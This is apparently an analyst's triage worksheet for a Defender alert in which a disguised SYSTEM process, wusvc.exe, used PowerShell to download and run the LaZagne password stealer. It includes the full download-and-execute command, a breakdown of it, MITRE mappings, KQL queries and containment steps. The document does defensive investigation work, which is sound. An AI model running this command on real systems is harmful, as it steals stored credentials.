1. Anchor the investigation: What alert fired, on what host, as which account, at what time.

alert: Suspicious process executed PowerShell command

host: 
ec2amaz-9oh9aqq
IP addresses
Private: 172.31.0.166
Public: 43.220.1.17

account:  system 

time: 25/6/2026
10:40:25





  

2. Walk the process tree: From top to bottom until you find the the process/activity that doesn't belong (usually has the red zap icon, indicating detected malicious activity). Note down the malicious activity.

## What happened

A process named `wusvc.exe` (PID 1828) was running on EC2AMAZ-9OH9AQQ as NT AUTHORITY\SYSTEM. It isn't a real Windows file; the name looks chosen to pass for the Windows Update service.

At 10:40:25 on 25/6/2026, `wusvc.exe` started `powershell.exe` (PID 2544) with `-ExecutionPolicy Bypass`, which turns off PowerShell's script checks. The PowerShell binary itself is the genuine Microsoft file; the problem is the process that started it.

Going by the command line, PowerShell then:

1. Created a folder at `%TEMP%\svcmon`. For SYSTEM, `%TEMP%` normally points to `C:\Windows\Temp`.
2. Downloaded **LaZagne v2.4.3** from GitHub and saved it in that folder as `lz.exe`.
3. Ran `lz.exe all`. LaZagne is a password-stealing tool, and `all` tells it to collect every saved password it can find on the host.

In short, a disguised SYSTEM-level process downloaded a password-stealing tool under a different name and ran it. The alert confirms the PowerShell launch; the command line shows the download and run were attempted, but nothing so far confirms they succeeded.

## Timeline

| Time (AEST)               | Time (UTC)      | Event                                                                                    | Status            |
| ------------------------- | --------------- | ---------------------------------------------------------------------------------------- | ----------------- |
| Before 25/6 10:40:25      | –               | `wusvc.exe` placed on host and started as SYSTEM                                         | Not yet confirmed |
| 25/6/2026 10:40:25        | 00:40:25        | `wusvc.exe` (PID 1828) starts `powershell.exe` (PID 2544) with `-ExecutionPolicy Bypass` | Confirmed (alert) |
| 25/6/2026 10:40:25 onward | 00:40:25 onward | Folder `%TEMP%\svcmon` created                                                           | From command line |
| 25/6/2026 10:40:25 onward | 00:40:25 onward | LaZagne.exe downloaded from github.com and saved as `lz.exe`                             | From command line |
| 25/6/2026 10:40:25 onward | 00:40:25 onward | `lz.exe all` run to collect stored passwords                                             | From command line |
| After 25/6 10:40:25       | –               | Possible sign-ins with stolen credentials                                                | Not yet checked   |



  

3. Translate, don't transcribe. For each malicious activity you noted down, write in your own words: what they ran (the evidence/command etc - understand it in detail, research etc) → what it achieved (stolen creds?)→ What technique is this? (MITRE ATT&CK ID - learn whats happening here and the risk associated, start thinking about what impact this could have, that will inform your containment recos).

The attacker used a disguised program running with full system rights to download a well-known password-stealing tool and run every one of its collection modules. Assume every credential stored on EC2AMAZ-9OH9AQQ is now in the attacker's hands. I'd treat this as High severity even though the alert says Medium and Resolved.

## Part 1: Each malicious activity in plain terms

### Activity 1: A disguised program running as SYSTEM

- **What they ran:** `wusvc.exe` (PID 1828), running as NT AUTHORITY\SYSTEM. It is not a real Windows file. The name looks chosen to pass for Windows Update (`wuauserv`).
- **What it achieved:** The attacker already had full control of the host before 10:40. LaZagne was run without any output-file option, so its results only printed to the screen. That output would have gone back to `wusvc.exe`, which suggests `wusvc.exe` is the attacker's remote-control tool (implant) passing results back to them.
- **Technique:**

|ID|Technique|Status|
|---|---|---|
|T1036.005|Masquerading: match legitimate name|Seen|
|T1543.003|Windows Service|Suspected; would explain how it survives reboots as SYSTEM|
|T1041|Exfiltration Over C2 Channel|Inferred from how the output was handled|

- **Risk:** This is the root cause. Deleting LaZagne alone leaves the attacker's access in place.

### Activity 2: PowerShell started with script checks turned off

- **What they ran:** `wusvc.exe` started `powershell.exe -ExecutionPolicy Bypass -C "..."`. The PowerShell file itself is the genuine Microsoft one; what matters is the process that started it.
- **What it achieved:** It ran the attacker's commands through a trusted built-in tool, so no extra malware was needed for this step.
- **Technique:** **T1059.001** (Command and Scripting Interpreter: PowerShell).
- **Risk:** Execution policy isn't a security control and doesn't block inline commands anyway. The attacker added the flag out of habit, which points to a scripted, hands-on-keyboard or automated playbook.

### Activity 3: The tool was downloaded and renamed

- **What they ran:** `Net.WebClient.DownloadFile` fetched LaZagne v2.4.3 from GitHub and saved it as `lz.exe` in a new folder called `svcmon`.
- **What it achieved:** The tool was placed on the host. Pulling it from github.com helps it blend in with normal web traffic, and the neutral file and folder names avoid attention.
- **Technique:**

|ID|Technique|
|---|---|
|T1105|Ingress Tool Transfer|
|T1036.008 / T1036.005|Masquerading (renamed tool, harmless-looking folder name)|

- **Risk:** The host can reach the internet freely, so the attacker can bring in any other tools they want the same way.

### Activity 4: Password theft with `lz.exe all`

- **What they ran:** LaZagne with the `all` option, which runs every collection module. Running as SYSTEM, it can reach:
    - Saved browser passwords.
    - Windows Credential Manager and Vault.
    - Wi-Fi keys.
    - Saved credentials in admin tools such as PuTTY, WinSCP, FileZilla and RDP managers.
    - Git credentials and database clients.
    - Windows secrets: SAM password hashes, LSA secrets (which can include service account passwords and autologon passwords) and cached domain logons.
    - In recent versions, credentials held in memory (LSASS and KeePass).
- **What it achieved:** Stolen credentials. That likely includes the local admin hash, service account passwords and cached hashes for any domain users who have logged on, plus passwords for other systems saved on this host.
- **Technique:**

|ID|Technique|
|---|---|
|T1555|Credentials from Password Stores (.003 Web Browsers, .004 Windows Credential Manager)|
|T1003.002|OS Credential Dumping: SAM|
|T1003.004|OS Credential Dumping: LSA Secrets|
|T1003.005|OS Credential Dumping: Cached Domain Credentials|
|T1003.001|OS Credential Dumping: LSASS Memory (if the memory module ran)|

- **Risk:** This is the most serious step because it shows the attacker preparing to move to other systems.

## Impact and risk

- **Spread to other machines (T1021, T1550.002):** The local admin hash can be reused on any other server that shares that password. Stolen domain, service or saved RDP/SSH credentials open more systems.
- **Taking over the domain:** If a privileged domain account had ever logged on here, its cached hash or LSA secret is exposed.
- **Spread into AWS:** A SYSTEM-level attacker on an EC2 instance can also request the instance's IAM role credentials from the instance metadata service. Any AWS keys stored on the host are exposed too. That puts the AWS account at risk, not just this Windows host.
- **Ongoing access:** Unless `wusvc.exe` is removed, the attacker keeps SYSTEM-level control and a channel to send data out.

## Containment recommendations (driven by the above)

1. **Isolate the host, but keep the evidence.** Swap its security group for an isolation group or use Defender isolation. Before any rebuild, take EBS snapshots and a memory capture. Don't terminate the instance.
2. **Remove the root cause.** Stop and remove `wusvc.exe` and any service behind it. Block its hash across the fleet. Block its outbound destinations; the network events will show its command-and-control addresses.
3. **Assume every credential on this host is stolen, and reset:**
    - The local Administrator password everywhere it is reused (roll LAPS).
    - Every service account on the host.
    - Every domain account that has logged on here. Your logon query from 25/6 10:40:25 onward gives part of this list; also check older sessions.
    - Every saved credential for other systems, changed at those systems (RDP, SSH, FTP, databases, web apps).
4. **Contain the AWS side.** Revoke active sessions for the instance's IAM role and rotate any stored access keys. Check CloudTrail for that role or those keys being used from unusual IP addresses.
5. **Hunt for use of the stolen credentials:**
    - Logons after 10:40:25 from these accounts to other hosts, especially NTLM network logons (a sign of hash reuse).
    - `wusvc.exe`, `lz.exe` or `svcmon` on other hosts.
    - Other processes started by `wusvc.exe`.
6. **Reopen the alert and raise the severity.** Its status doesn't match what happened.

## Part 2: What the command did, step by step

```powershell
powershell.exe -ExecutionPolicy Bypass -C "md \"$env:TEMP\svcmon\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',\"$env:TEMP\svcmon\lz.exe\"); & \"$env:TEMP\svcmon\lz.exe\" all"
```

|Part|What it does|
|---|---|
|`powershell.exe -ExecutionPolicy Bypass`|Starts PowerShell and ignores the script-running policy.|
|`-C "..."`|Runs the quoted text as commands directly, without a script file. The `\"` are escaped quotes so the inner paths survive the outer command line.|
|`md "$env:TEMP\svcmon" -f`|`md` is short for "make directory". It creates a folder called `svcmon` in the TEMP folder. Because this ran as SYSTEM, TEMP is usually `C:\Windows\Temp`. `-f` (Force) means no error if the folder already exists.|
|`\| Out-Null`|Throws away the command's normal output so nothing shows on screen.|
|`;`|Separates commands. Each one runs in turn whether or not the previous one worked, so the run step was attempted even if the download failed.|
|`(New-Object Net.WebClient).DownloadFile('<url>', '<path>')`|Uses a built-in .NET web client to download LaZagne v2.4.3 from its official GitHub releases page and save it to disk as `C:\Windows\Temp\svcmon\lz.exe`. This leaves a file on disk, which is a useful artifact for forensics.|
|`& "$env:TEMP\svcmon\lz.exe" all`|`&` runs the program at that path. `all` tells LaZagne to run every password-collection module. No output-file option was given, so the results printed to the screen and were most likely read back by `wusvc.exe`.|

In one line: the command quietly made a hidden-looking folder, downloaded a password-stealing tool from GitHub under a harmless name, and ran every one of its collection modules as SYSTEM.

**Checks that would confirm this happened:**

- `DeviceFileEvents`: `lz.exe` created in `svcmon`.
- `DeviceNetworkEvents`: PowerShell connecting to `github.com` and `objects.githubusercontent.com`.
- `DeviceProcessEvents`: `lz.exe` actually running, plus any processes it started.

  

4. KQL Pivot: As a habit, use Advanced Hunting KQL to search for other activity on that device (around the same timeframe of the alert +-10 mins). See if anything else happened that didnt get picked up by Defender. If you see something, go back to step 3. If nothing jumps out, no problem just move on.

nothing found

```
DeviceProcessEvents
|where DeviceName contains "ec2amaz-9oh9aqq"
| where Timestamp between (datetime(2026-06-25 00:30:25) .. datetime(2026-06-25 00:50:25))```
```
  

5. Check the blast radius: Does the alert/incident indicate another host was involved? If so and you want to check that host for activity as well, do a KQL pivot.
```
 AlertEvidence
| where AlertId == "daaaddd30b-702d-4e9d-9718-78bb4be8040b_1"
| where EntityType == "Account"
| distinct DeviceName

```

6. Finishing touches: Determine a verdict, did it succeed? Come up with your 3-5 containment steps. Couple screenshots, note KQL queries, check for mistakes and typos.


**True Positive (malicious).** A fake service, `wusvc.exe`, running as SYSTEM used PowerShell to download LaZagne (a password-stealing tool) and run it with `all`, which collects every saved password on the host.

- The verdict is that it succeed running the malicous powershell comamnd
	- issolcate the device until all malicous files have been contained
	remove command injections on user based levels like wusvc, block any services and remove files on windos temp file C:\Windows\Temp\svcmon\' and block it's hashes 
	- reset all credentias logs stored on the that host devices including local admin accounts, sere accounts, domain accounts that have been affected and clear any saved passwords on that host
	- Rebuild the device with a new hostname when needed and assigning a new IP address
	- Revoked any EC@ instances with IAM role essions and track down the cloudtrail process.



